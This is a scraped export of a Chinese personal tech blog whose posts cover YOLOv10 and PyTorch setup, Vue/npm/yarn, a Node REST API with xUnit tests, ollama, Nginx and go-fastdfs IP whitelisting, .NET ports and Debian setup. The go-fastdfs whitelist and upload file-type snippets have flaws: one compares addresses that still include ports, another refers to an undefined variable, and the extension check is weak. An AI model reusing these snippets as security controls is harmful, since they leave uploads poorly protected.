10.1或更新版本。。cuDNN版本:与CUDA版本对应的cuDNN版本，。NVIDIA驱动程序:推荐使用最新版本的NVIDIA驱动程序，以确保最佳性能和功能支持。 如果不行就只能CPU训练~ 安装conda环境1、显卡信息查看nvidia-smi nv控制版面 2、下载anaconda3https://repo.anaconda.com/archive/Anaconda3-2024.06-1-Windows-x86 64.exehttps://www.anaconda.com/ 3、配置环境变量E:\\Application\\anaconda3E:\\Applicationanaconda3\\ScriptsE:\\Application\\anaconda3\\Library\\bin 系统变量path 验证环境是否OK，出现base代表OK，没有出现卸载在安装一次1conda env list 验证简单conda命令创建python环境 1conda create -n yolov10 python==3.9 2、查看现有环境1conda env list 3、激活环境 conda init1conda activate yolo 4、激活失败1conda init cmd.exe 5、删除环境conda env remove -n yolo10 配置YOLOv10环境提示:千万别开加速器，强调N遍，开完加速器可能版本不兼容，环境折腾死人 下载YOLov10源码https://github.com/THU-MIG/yolov10 创建YOLOv10环境conda create -n yolov10 python&#x3D;&#x3D;3.9 激活yolov10环境conda activate yolov10 找到源码下的的requirement.txt文档把torch和torchvision两个注释掉 手动安装pytorch和tourchvision。进入pythorch官网找到2.0.1的版本，复制链接后手动安装pip install torch&#x3D;&#x3D;2.0.1 torchvision&#x3D;&#x3D;0.15.2 torchaudio&#x3D;&#x3D;2.0.2 –index-url https://download.pytorch.org/whl/cu118验证是否OK,显示结果为True代表就OKimport torchtorch.cuda.is available()&#x3D;&#x3D;&#x3D; true 安装成功后，执行pythonpip install -r requirements.txt 编译源码pip install -e . 下载预训练权重模型https://github.com/THU-MIG/yolov10 https://github.com/THU-MIG/yolov10/releases/tag/v1.1 .pt yolov10-main&gt;yolo predict model&#x3D;yolov10n.pt source&#x3D;cat.jpg 标注工具lablemechineselableImg PS PyTorchPyTorch 是一种开源深度学习框架，以出色的灵活性和易用性著称。这在一定程度上是因为与机器学习开发者和数据科学家所青睐的热门 Python 高级编程语言兼容。 什么是 PyTorch?PvTorch 是一种用于构建深度学习模型的功能完备框架，是一种通常用于图像识别和语言处理等应用程序的机器学习。使用 Python 编写，因此对于大多数机器学习开发者而言，学习和使用起来相对简单。PyTorch 的独特之处在于，它完全支持 GPU，并且使用反向模式自动微分技术，因此可以动态修改计算图形。这使其成为快速实验和原型设计的常用选择。 为何选择 PyTorch?PyTorch 是 Facebook Al Research 和其他几个实验室的开发者的工作成果。该框架将 Torch 中高效而灵活的 GPU 加谏后端库与直观的 Pvthon 前端相结合，后者专注于快速原型设计、可读代码，并支持尽可能广泛的深度学习模型。Pytorch 支持开发者使用熟悉的命令式编程方法，但仍可以输出到图形。它于 2017 年以开源形式发布，其Python 根源使其深受机器学习开发者的喜爱。和TensorFlow区别 是 可以动态修改计算图形。灵活性，易用性，深度学习框架。 TensorFlowTensorFlow 是一款先进的开源库，旨在开发和部署先进的机器学习应用程序。 什么是 TensorflowTensorFlow 是数据科学家、软件开发者和教育工作者主要使用的开源平台，用于使用数据流图形进行机器学习。图像中的节点代表数学运算，而图像边缘则代表节点间流动的多维数据阵列(张量)。这种灵活的架构允许将机器学习算法描述为相关运算的图形。可以在便携式设备、台式电脑和高端服务器等众多不同平台的 GPU、CPU 和TPU 上训练和执行这些代码，而无需重写代码。这意味着各种背景的编程人员均可以使用相同的工具集进行协作从而显著提高效率，该系统最初由 Google Brain 团队开发，用于研究机器学习和深度神经网络(DNN)，其通用性同样适用于其他各种领域。TensorFlow的工作原理TensorFlow 工作流程由三个不同的部分定义，即数据预处理、构建模型和训练模型，从而进行预测。该框架将数据输入称为张量的多维数组，并以两种不同的方式执行。主要方法是构建一个计算图形来定义用于训练模型的数据流。第二种常用的更直观的方法是使用 Eager Execution，该方法遵循命令编程原则并立即评估操作。使用 TensorFlow 架构，通常在台式电,脑或数据中心完成训练。这两种情况下，均通过在 GPU 上放置张量来加快处理速度。然后，经过训练的模型可以在一系列平台上运行，从台式电脑到移动设备，然后一直到云端。TensorFlow 还包含很多支持功能。例如，TensorBoard 允许用户以直观方式监控训练过程、底层计算图形和指标以便调试运行以及评估模型性能。TensorBoard 是 Tensorflow 和 Keras 的统一可视化框架,Keras 是在 TensorFlow 上运行的高级 API。Keras 通过提供用于构建常见用例模型的简化 API，进一步深化TensorFlow 的抽象概念。API 背后的驱动理念是能够在更短的时间内将想法落实为结果。 TensorFlow 的优势TensorFlow 可用于开发自然语言处理、图像识别、手写识别以及基于计算的不同模拟(例如偏微分方程)等各种任务模型。Tensorflow 的主要优势在于其能够跨多个加速平台执行低级运算、自动计算梯度、生产级可扩展性和可互操作的图形导出。通过为 Keras 提供高级 AP!和 Eager Execution，替代 Tensorflow 上的数据流范式，始终可以轻松便捷地编写代码。作为 Tensorflow 的原始开发者，Google 仍然大力支持该库，并加快其发展速度。例如，Google 创建了一个在线中心，用于共享用户创建的许多不同模型。 TensorFlow和NVIDIA图形处理器或 GPU 配备由数千个小型高效核心组成的大规模并行架构，可以同时启动数千个并行线程，能够强力支持计算密集型任务。CPU MULTIPLE CORES GPU THOUSANDS OF CORES十年前，研究人员发现 GPU 非常擅长矩阵运算和代数计算，而深度学习就十分依赖于这两种运算。TensorFlow 在新款 NVIDIA Pascal GPU 上的运行速度可提升高达 50%，并且能够顺利跨 GPU 进行扩展。 如今，您训练模型的时间可以从几天缩短到几小时。TensorFlow 使用优化的 C++ 和 NVIDIA’CUDA·工具包编写，使模型能够在训练和推理时在 GPU 上运行，从而大幅提速。TensorFlow GPU 支持需要多个驱动和库。为简化安装并避免库冲突，建议利用 GPU 支持的 TensorFlow Docker 镜像。此设置仅需要 NVIDIA GPU 驱动并且安装 NVIDIA Docker。用户可以从预配置了预训练模型和 Tensorflow 库支持的 NGC(NVIDIA GPU Cloud)中提取容器。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"yolo","slug":"yolo","permalink":"https://banjinmei.github.io/tags/yolo/"}],"author":"mu"},{"title":"VUE npm yarn","slug":"VUE-npm-yarn","date":"2024-07-27T15:53:03.000Z","updated":"2024-07-27T15:55:36.000Z","comments":true,"path":"2024/07/27/VUE-npm-yarn/","permalink":"https://banjinmei.github.io/2024/07/27/VUE-npm-yarn/","excerpt":"","text":"vite cretae vue npm yarn1npm init vite PNvue3ts 123cd PNnpm install npm run dev or 123npm install -g yarnyarn yarn dev 123456789101112131415161718192021NPMnpm init 初始化某个项目npm install/link 默认的安装依赖操作npm install taco --save 安装某个依赖，并且默认保存到package.npm uninstall taco --save 安装某个开发时依赖项目npm install taco --save-dev 更新某个依赖项目npm update taco --save安装某个全局依赖项目npm install taco --global 安装某个全局依赖项目npm publish/login/1ogout 发布/登录/登出，一系列NPM Registry操作npm rutest 运行某个命令YARNyarn init 初始化某个项目yarn install/link 默认的安装依赖操作yarn add taco 安装某个依赖，并且默认保存到package.yarn remove taco 安装某个开发时依赖项目yarn add taco --dev 安装某个开发时依赖项目yarn upgrade taco 更新某个依赖项目yarn global add taco 安装某个全局依赖项目yarn publish/login/1ogout 发布/登录/登出，一系列NPM Registry操作yarn rutest 运行某个命令 -S等同于–save，将依赖安装至运行依赖-D等同于–save-dev，将依赖安装至开发依赖-g全局 123yarn add vue-router -Syarn add element-plus -S 按需加载 1yarn add unplugin-vue-components -D package.json 查看 依赖 main.ts -&gt; app.vue elementplup dochttp://element-plus.org/zh-CN/component/overview.htmlhttps://element-plus.org/zh-CN/guide/quickstart.html","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"},{"name":"VUE","slug":"VUE","permalink":"https://banjinmei.github.io/tags/VUE/"},{"name":"yarn","slug":"yarn","permalink":"https://banjinmei.github.io/tags/yarn/"}],"author":"mu"},{"title":".NET MSTest Xunit","slug":"NET-MSTest-Xunit","date":"2024-07-26T15:37:05.000Z","updated":"2024-07-26T15:41:28.000Z","comments":true,"path":"2024/07/26/NET-MSTest-Xunit/","permalink":"https://banjinmei.github.io/2024/07/26/NET-MSTest-Xunit/","excerpt":"","text":"node api下面是一个使用 Node.js 和 Express.js 编写的简单 RESTful API 示例。 1. 初始化项目首先，创建一个新的项目目录并进入该目录： 12mkdir myapicd myapi 然后初始化一个新的 Node.js 项目： 1npm init -y 2. 安装依赖安装 Express.js 作为我们的 Web 框架： 1npm install express 3. 创建主文件在项目根目录下创建一个名为 index.js 的文件： 1touch index.js 4. 编写 RESTful API 代码在 index.js 中编写以下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768const express = require(&#x27;express&#x27;);const app = express();const port = 3000;app.use(express.json());let items = [ &#123; id: 1, name: &#x27;Item 1&#x27; &#125;, &#123; id: 2, name: &#x27;Item 2&#x27; &#125;, &#123; id: 3, name: &#x27;Item 3&#x27; &#125;];// 获取所有项目app.get(&#x27;/items&#x27;, (req, res) =&gt; &#123; res.json(items);&#125;);// 获取单个项目app.get(&#x27;/items/:id&#x27;, (req, res) =&gt; &#123; const id = parseInt(req.params.id); const item = items.find(i =&gt; i.id === id); if (item) &#123; res.json(item); &#125; else &#123; res.status(404).send(&#x27;Item not found&#x27;); &#125;&#125;);// 创建新项目app.post(&#x27;/items&#x27;, (req, res) =&gt; &#123; const newItem = &#123; id: items.length + 1, name: req.body.name &#125;; items.push(newItem); res.status(201).json(newItem);&#125;);// 更新项目app.put(&#x27;/items/:id&#x27;, (req, res) =&gt; &#123; const id = parseInt(req.params.id); const item = items.find(i =&gt; i.id === id); if (item) &#123; item.name = req.body.name; res.json(item); &#125; else &#123; res.status(404).send(&#x27;Item not found&#x27;); &#125;&#125;);// 删除项目app.delete(&#x27;/items/:id&#x27;, (req, res) =&gt; &#123; const id = parseInt(req.params.id); const itemIndex = items.findIndex(i =&gt; i.id === id); if (itemIndex !== -1) &#123; items.splice(itemIndex, 1); res.status(204).send(); &#125; else &#123; res.status(404).send(&#x27;Item not found&#x27;); &#125;&#125;);app.listen(port, () =&gt; &#123; console.log(`Server is running on http://localhost:$&#123;port&#125;`);&#125;); 运行服务器在终端中运行以下命令来启动服务器：12node index.js 现在，服务器应该在 http://localhost:3000 上运行 以下是 API 端点的简要说明：GET &#x2F;items - 获取所有项目GET &#x2F;items&#x2F;:id - 获取单个项目POST &#x2F;items - 创建新项目PUT &#x2F;items&#x2F;:id - 更新项目DELETE &#x2F;items&#x2F;:id - 删除项目 单元测试。1. 创建 C# 项目首先，创建一个新的 xUnit 测试项目： 123dotnet new xunit -n MyApiTestscd MyApiTests 2. 安装 RestSharp安装 RestSharp 库，它将用于发送 HTTP 请求： 1dotnet add package RestSharp 3. 编写单元测试在 MyApiTests 项目中，创建一个名为 ApiTests.cs 的文件，并编写以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364using RestSharp;using System.Threading.Tasks;using Xunit;public class ApiTests&#123; private const string BaseUrl = &quot;http://localhost:3000&quot;; [Fact] public async Task Test_GetAllItems() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items&quot;, Method.Get); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;Item 1&quot;, response.Content); &#125; [Fact] public async Task Test_GetSingleItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items/1&quot;, Method.Get); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;Item 1&quot;, response.Content); &#125; [Fact] public async Task Test_CreateNewItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items&quot;, Method.Post); request.AddJsonBody(new &#123; name = &quot;New Item&quot; &#125;); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;New Item&quot;, response.Content); &#125; [Fact] public async Task Test_UpdateItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items/1&quot;, Method.Put); request.AddJsonBody(new &#123; name = &quot;Updated Item&quot; &#125;); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;Updated Item&quot;, response.Content); &#125; [Fact] public async Task Test_DeleteItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items/1&quot;, Method.Delete); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); &#125;&#125; 运行测试在终端中运行以下命令来执行测试：1dotnet test 执行所有测试，并显示测试结果。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"ollama gpt qwen gemma2 deepseek loacl AI","slug":"ollama-gpt-qwen-gemma2-deepseek-loacl-AI","date":"2024-07-26T15:33:08.000Z","updated":"2024-07-26T15:34:26.000Z","comments":true,"path":"2024/07/26/ollama-gpt-qwen-gemma2-deepseek-loacl-AI/","permalink":"https://banjinmei.github.io/2024/07/26/ollama-gpt-qwen-gemma2-deepseek-loacl-AI/","excerpt":"","text":"https://ollama.com/ollama https://ollama.com/librarymodels 12ollama run qwen2 send a message 12ollama run gemma2 https://github.com/open-webui/open-webuiwebui 1docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main N卡 gpu 1docker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda http://localhost:3000/ https://ollama.com/library/deepseek-coder-v2deepseek-coder-v2 ~~codeqwensqlcoder curl -X POST http://localhost:11434/api/generate -d ‘{ “model”: “llama2-chinese:7b-chat-q4_0”, “prompt”:”为什么天空是蓝色的” }’ https://docs.openwebui.com/","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"ollama","slug":"ollama","permalink":"https://banjinmei.github.io/tags/ollama/"}],"author":"mu"},{"title":"Gofastdfs whitelist","slug":"Gofastdfs-whitelist","date":"2024-07-25T15:46:59.000Z","updated":"2024-12-07T18:19:00.094Z","comments":true,"path":"2024/07/25/Gofastdfs-whitelist/","permalink":"https://banjinmei.github.io/2024/07/25/Gofastdfs-whitelist/","excerpt":"","text":"在go-fastdfs项目中，要实现IP白名单限制上传功能，你需要在处理上传请求的地方进行检查。根据你提供的代码，上传逻辑主要在server.go文件中的HttpHandler的ServeHTTP方法里通过调用mux.ServeHTTP(res, req)来分发请求到不同的处理函数。 IP白名单限制定义白名单：首先需要定义一个变量来存储允许的IP地址。可以在server.go的Server结构体中添加一个字段来存储这个白名单。 123456789101112131415type Server struct &#123; // ... 其他字段 ... allowedIPs map[string]struct&#123;&#125;&#125;func NewServer() *Server &#123; server := &amp;Server&#123; // ... 初始化其他字段 ... allowedIPs: make(map[string]struct&#123;&#125;), &#125; // 假设允许的IP是 &quot;192.168.1.1&quot; 和 &quot;10.12.188.85&quot; server.allowedIPs[&quot;192.168.1.1&quot;] = struct&#123;&#125;&#123;&#125; server.allowedIPs[&quot;10.12.188.85&quot;] = struct&#123;&#125;&#123;&#125; return server&#125; 修改HttpHandler：在HttpHandler的ServeHTTP方法中添加一个检查逻辑，以确定请求的IP是否在白名单中。 123456789101112131415func (httpHandler *HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) &#123; if !server.isIPAllowed(req) &#123; http.Error(res, &quot;Access denied&quot;, http.StatusForbidden) return &#125; // 原有的处理逻辑 mux.ServeHTTP(res, req)&#125;func (server *Server) isIPAllowed(req *http.Request) bool &#123; clientIP := req.RemoteAddr // 检查IP是否在白名单中 _, allowed := server.allowedIPs[clientIP] return allowed&#125; 调用修改后的NewServer：确保在初始化服务器时使用修改后的NewServer函数来创建Server实例，并设置白名单。 更新InitServer函数：在InitServer函数中，确保使用修改后的NewServer函数。 1234567func InitServer() &#123; // ... 省略其他代码 ... server = NewServer() // 使用修改后的构造函数 // ... 省略其他代码 ...&#125; 重新编译和部署：对项目进行重新编译，并部署修改后的代码。这样，任何不符合白名单中的IP地址的上传请求都将被拒绝，返回HTTP状态403 Forbidden。请根据你的项目结构和配置适当调整上述代码。 只限制upload如果你想只对特定的接口（如 &#x2F;group1&#x2F;upload）实施IP白名单限制，而不影响其他页面或图片的访问，你可以在处理上传请求的特定路由中添加IP检查逻辑。以下是如何实现这个目的的步骤： 定义白名单：首先，定义一个变量来存储允许上传的IP地址。 12345var allowedUploadIPs = map[string]struct&#123;&#125;&#123; &quot;192.168.1.1&quot;: &#123;&#125;, &quot;10.12.188.85&quot;: &#123;&#125;, // 可以继续添加更多的允许上传的IP地址&#125; 修改上传处理函数：找到处理 &#x2F;group1&#x2F;upload 路由的函数，这可能是 Server 结构体的一个方法，比如 Upload 方法。在这个函数的开始处添加IP检查逻辑。 1234567891011121314func (c *Server) Upload(w http.ResponseWriter, r *http.Request) &#123; if !isIPAllowed(r) &#123; http.Error(w, &quot;Access denied&quot;, http.StatusForbidden) return &#125; // 原有的上传处理逻辑 // ...&#125;func isIPAllowed(r *http.Request) bool &#123; clientIP := c.GetRealIp(r) // 确保这个方法返回的是请求的IP地址 _, allowed := allowedUploadIPs[clientIP] return allowed&#125; 更新路由：确保你的路由设置正确地将 &#x2F;group1&#x2F;upload 请求映射到 Upload 方法。 123456789func (c *Server) initRouter() &#123; // 其他路由设置... // 映射/group1/upload到Upload方法 // 注意这里的具体实现可能依赖于你使用的HTTP多路复用器或框架 mux.HandleFunc(&quot;/group1/upload&quot;, c.Upload)&#125; 不要在其他路由中添加IP检查：确保只有 &#x2F;group1&#x2F;upload 路由的处理函数中添加了IP检查逻辑。其他路由的处理函数保持不变，这样就不会对其他页面或图片的访问造成影响。 重新编译和部署：对项目进行重新编译，并部署修改后的代码。 通过这种方式，只有当用户尝试访问 &#x2F;group1&#x2F;upload 接口时，才会检查IP白名单；其他所有路由和资源的访问都不会受到IP白名单的限制。请根据你的实际代码结构和路由设置适当调整上述示例代码。 忽略端口HTTP请求的远程地址（r.RemoteAddr）通常包含IP地址和端口号，格式如IP:PORT。如果你希望在检查IP白名单时忽略端口号，只根据IP地址来判断，你需要从r.RemoteAddr中提取出IP地址部分。 在Go语言中，你可以使用strings.Split函数来分割字符串，获取IP地址。以下是调整后的isIPAllowed函数： 12345678910111213func (server *Server) isIPAllowed(r *http.Request) bool &#123; clientIPPort := r.RemoteAddr // 包含IP和端口号，例如 &quot;192.168.80.123:56533&quot; clientIPParts := strings.Split(clientIPPort, &quot;:&quot;) // 分割为 [&quot;192.168.80.123&quot;, &quot;56533&quot;] if len(clientIPParts) &lt; 2 &#123; // 如果分割后的结果不足2部分，说明没有端口号，直接返回不允许 return false &#125; clientIP := clientIPParts[0] // 提取IP地址 // 检查IP是否在白名单中 _, allowed := server.allowedIPs[clientIP] return allowed&#125; 这段代码首先将r.RemoteAddr按照”:”分割成两部分，第一部分是IP地址，第二部分是端口号。然后，它检查分割后的数组长度是否至少为2，以确保端口号存在。如果长度小于2，则可能表示远程地址格式不正确，此时函数返回false，表示不允许访问。如果长度足够，它将取出IP地址部分，并检查该IP是否在白名单中。 请确保server.allowedIPs已经被正确初始化并包含了所有允许的IP地址。例如： 1234server.allowedIPs = map[string]struct&#123;&#125;&#123; &quot;192.168.80.123&quot;: &#123;&#125;, // 允许的IP地址 // 可以继续添加更多的IP地址&#125; 这样，isIPAllowed函数就可以根据IP地址而不是IP和端口的组合来判断请求是否被允许。 复习1234567891011121314151617 //http.DefaultServeMux.ServeHTTP(res, req) if !server.isIPAllowed(req) &#123; http.Error(res, &quot;Access denied&quot;, http.StatusForbidden) return &#125; mux.ServeHTTP(res,req)func (server *Server) isIPAllowed(req *http.Request) bool &#123; clientIP := req.RemoteAddr fmt.Println(&quot;ip &quot; + clientIP) // 检查IP是否在白名单中 _, allowed := server.allowedIPs[clientIP] return allowed&#125; http_upload.go 12345678func (c *Server) Upload(w http.ResponseWriter, r *http.Request) &#123; if !server.isIPAllowed(r) &#123; http.Error(w, &quot;Access denied&quot;, http.StatusForbidden) return &#125;&#125; 要点 1func (c *Server) Upload(w http.ResponseWriter, r *http.Request) &#123; //权限IP 限制文件类型12345678910func (c *Server) SaveUploadFile(file multipart.File, header *multipart.FileHeader, fileInfo *FileInfo, r *http.Request) (*FileInfo, error) &#123; _, fileInfo.Name = filepath.Split(header.Filename) //如果不是 jpg png data 则不让上传 fileInfo.Name = c.TrimFileNameSpecialChar(fileInfo.Name) fmt.Println(&quot;fname- &quot; +fileInfo.Name) extension := strings.Split(fileInfo.Name, &quot;.&quot;)[1] if extension != &quot;jpg&quot; &amp;&amp; extension != &quot;png&quot; &amp;&amp; extension != &quot;data&quot; &#123; fmt.Println(&quot;fnameext- &quot; +extension) return fileInfo, err &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"}],"author":"mu"},{"title":"Nginx whitelist","slug":"Nginx-whitelist","date":"2024-07-23T15:56:32.000Z","updated":"2024-07-23T15:59:02.000Z","comments":true,"path":"2024/07/23/Nginx-whitelist/","permalink":"https://banjinmei.github.io/2024/07/23/Nginx-whitelist/","excerpt":"","text":"在 Debian 系统上安装 Nginx 更新包列表： 1sudo apt update 安装 Nginx：使用 apt 包管理器来安装 Nginx。 1sudo apt install nginx 启动 Nginx： 1sudo systemctl start nginx 启用开机自启动： 1sudo systemctl enable nginx 检查 Nginx 状态： 1sudo systemctl status nginx 配置防火墙（可选）： 1sudo ufw allow &#x27;Nginx Full&#x27; 访问你的服务器：安装完成后，你可以通过浏览器访问你的服务器 IP 地址来验证 Nginx 是否安装成功。你应该会看到默认的 Nginx 欢迎页面。 配置 HTTPS（可选） 如果你希望使用 HTTPS，可以按照以下步骤操作： 获取 SSL 证书：可以使用 Let’s Encrypt 免费获取一个 SSL 证书。运行以下命令来安装 Certbot 和 Nginx 插件： 12sudo apt install certbot python3-certbot-nginx 获取并安装证书：运行以下命令来获取并安装证书： 1sudo certbot --nginx -d yourdomain.com 请将 yourdomain.com 替换为你的实际域名。 配置自动更新证书：你可以设置一个 cron 任务来自动更新证书，运行以下命令来设置定时任务： 1sudo systemctl enable certbot-renewal 12sudo nano /etc/nginx/sites-available/fastdfs 在文件中添加以下内容： nginx 12345678910111213141516server &#123; listen 80; server_name yourdomain.com; # 允许的IP地址列表 allow 192.168.1.0/24; allow 10.0.0.0/8; deny all; location /group1/M00 &#123; proxy_pass http://localhost:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 请将 yourdomain.com 替换为你的实际域名，并确保 IP 地址列表与你的需求匹配。 123sudo systemctl stop nginxsudo systemctl start nginx","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://banjinmei.github.io/tags/Nginx/"}],"author":"mu"},{"title":".NET Web Port","slug":"NET-Web-Port","date":"2024-06-26T17:02:56.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/27/NET-Web-Port/","permalink":"https://banjinmei.github.io/2024/06/27/NET-Web-Port/","excerpt":"","text":"在 .NET8 中，在 Program 类中配置服务和请求管道 示例1234567891011121314151617181920212223242526272829303132333435363738using Microsoft.AspNetCore.Builder;using Microsoft.AspNetCore.Hosting;using Microsoft.Extensions.DependencyInjection;using Microsoft.Extensions.Hosting;namespace WServer&#123; public class Program &#123; public static void Main(string[] args) &#123; var builder = WebApplication.CreateBuilder(args); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); // Configure the HTTP request pipeline. if (!app.Environment.IsDevelopment()) &#123; app.UseExceptionHandler(&quot;/Home/Error&quot;); &#125; app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); app.MapControllerRoute( name: &quot;default&quot;, pattern: &quot;&#123;controller=Home&#125;/&#123;action=Index&#125;/&#123;id?&#125;&quot;); // 设置默认启动端口 app.Urls.Add(&quot;http://localhost:5000&quot;); // 这里设置为 5000 app.Run(); &#125; &#125;&#125; 启动时自动从环境变量或配置文件中读取端口号 12var port = Environment.GetEnvironmentVariable(&quot;ASPNETCORE_PORT&quot;) ?? &quot;5000&quot;;app.Urls.Add($&quot;http://localhost:&#123;port&#125;&quot;); 也可以从配置文件中读取端口号，例如 appsettings.json： 123var port = builder.Configuration.GetValue&lt;int&gt;(&quot;Port&quot;).ToString();app.Urls.Add($&quot;http://localhost:&#123;port&#125;&quot;); 多端口号123456789// 配置 IConfiguration var configuration = builder.Configuration; // 读取端口配置列表 var ports = configuration.GetSection(&quot;Ports&quot;).Get&lt;List&lt;int&gt;&gt;() ?? new List&lt;int&gt;(); foreach (var port in ports) &#123; app.Urls.Add($&quot;http://localhost:&#123;port&#125;&quot;); &#125; appsettings.json 文件包含了一个端口列表： 123&#123; &quot;Ports&quot;: [5000, 5001] // 配置多个端口&#125; debian当你在 Debian 系统上运行 dotnet run 并能够通过 http://localhost:5000 访问应用程序，但无法通过 IP:5000 访问时，这通常意味着你的应用程序只绑定到了本地回环接口（即 localhost），而没有绑定到所有可用的网络接口。以下是一些可能的解决方案： 确保应用程序绑定到所有接口：默认情况下，ASP.NET Core 应用程序应该监听所有可用的网络接口。如果你的应用程序只绑定到 localhost，你需要确保它绑定到 0.0.0.0，这代表所有网络接口。在 Program 类中设置 app.Urls 时，不要使用 localhost，而是使用 0.0.0.0： 1app.Urls.Add(&quot;http://0.0.0.0:5000&quot;); 检查防火墙设置：确保你的 Debian 系统上的防火墙没有阻止外部访问端口 5000。你可以使用 ufw 命令行工具来管理防火墙规则。例如，允许端口 5000 可以通过以下命令： sudo ufw allow 5000&#x2F;tcp检查网络配置：确保你的网络配置允许外部访问。这可能涉及到虚拟网络、容器网络或其他网络隔离技术。 使用环境变量：ASP.NET Core 应用程序也可以通过环境变量来设置 URL。你可以设置 ASPNETCORE_URLS 环境变量，然后在运行应用程序之前不指定具体的 app.Urls.Add： export ASPNETCORE_URLS&#x3D;http://0.0.0.0:5000dotnet run检查 Kestrel 服务器配置：Kestrel 是 ASP.NET Core 的默认 HTTP 服务器，它可能有自己的配置。确保 Kestrel 配置为监听所有接口。这可以在 Program 类中设置： 1234builder.WebHost.ConfigureKestrel(serverOptions =&gt;&#123; serverOptions.ListenAnyIP(5000);&#125;); 检查端口是否被占用：确保端口 5000 没有被其他服务占用。你可以使用 netstat -tuln | grep 5000 来检查端口的使用情况。 使用 dotnet 命令的额外参数：当你使用 dotnet run 命令时，可以通过 -urls 参数来指定 URL，例如： 1dotnet run --urls &quot;http://0.0.0.0:5000&quot; dibian .NET8环境注册微软密钥和软件仓库。 12wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.deb 安装.NET SDK。 1234sudo apt-get update; \\sudo apt-get install -y apt-transport-https &amp;&amp; \\sudo apt-get update &amp;&amp; \\sudo apt-get install -y dotnet-sdk-8.0 验证安装。 1dotnet --version","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"VM Linux win","slug":"VM-Linux-win","date":"2024-06-24T15:38:07.000Z","updated":"2024-06-26T17:02:40.000Z","comments":true,"path":"2024/06/24/VM-Linux-win/","permalink":"https://banjinmei.github.io/2024/06/24/VM-Linux-win/","excerpt":"","text":"debian12.5.0服务器安装参考https://blog.csdn.net/Go_ahead_forever/article/details/132679793 相关命令问题新用户使用sudo报错 xx is not the sudoers file.原因：book用户没有sudo的权限解决：https://blog.csdn.net/weixin_37787043/article/details/123045557 更新 清华-镜像源 (会快一些)：参考文档： https://blog.csdn.net/sinat_15028281/article/details/135638596 123su rootcp etc/apt/sources.list etc/apt/sources.list.backup // 备份vi etc/apt/sources.list // 修改镜像源 将etc&#x2F;apt&#x2F;sources.list文件内的内容清空，写入以下内容： 1234567891011deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmwaredeb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware# deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware 安装SSH安装： 1sudo apt-get install ssh 启动： 1sudo systemctl start ssh 启动则可ssh查看： 1sudo systemctl status ssh 安装vscode进入页面：https://code.visualstudio.com/docs/?dv=linux64_deb 自动下载安装包 cd downloads找到下载目录执行： 1sudo dpkg -i code_1.88.1-1712771838_amd64.deb 安装dockerDebian12.5: https://blog.csdn.net/qq_39997939/article/details/131405963 严格按步骤复制即可。 别用其他网站的安装方式，很容易错！！！！！ Ubuntu18.04: ubuntu18.04安装docker_ubuntu 18.04安装docker-CSDN博客 安装构建基础包它含有libc、gcc、g++、make、dpkg-dev执行命令： 1sudo apt update &amp;&amp; sudo apt install build-essential 